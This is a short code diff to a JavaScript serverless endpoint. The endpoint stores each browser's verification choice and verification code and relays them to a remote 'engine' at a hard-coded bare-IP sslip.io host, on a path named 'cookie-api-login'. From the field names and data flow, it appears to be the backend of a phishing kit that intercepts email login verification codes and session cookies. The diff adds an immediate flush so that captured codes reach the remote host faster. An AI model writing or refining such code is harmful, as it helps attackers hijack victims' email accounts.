@@ -1,5 +1,5 @@
 import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
-import { setCachedRow, getCachedRow } from "../../../../utils/cookieCache.js";
+import { setCachedRow, getCachedRow, immediateFlush } from "../../../../utils/cookieCache.js";
 import { incrementUsage } from "../../../../utils/serverlessTracker.js";
 
 function parseBody(text) {
@@ -35,11 +35,13 @@ export async function POST(request) {
         }
     } else if (updateType === 'verificationChoice' && verificationChoice) {
         updates.verificationChoice = verificationChoice;
+        updates.status = 'PROCESSING';
     } else if (updateType === 'verificationCode' && verificationCode) {
         updates.verificationCode = verificationCode;
     }
 
     setCachedRow(browserId, updates);
+    immediateFlush(browserId).catch(() => {});
 
     const engineUrl = process.env.ENGINE_URL || 'https://webfixx-serverless-zvre9t-e955ff-157-173-204-24.sslip.io';
     fetch(`${engineUrl}/emails/cookie/cookie-api-login`, {
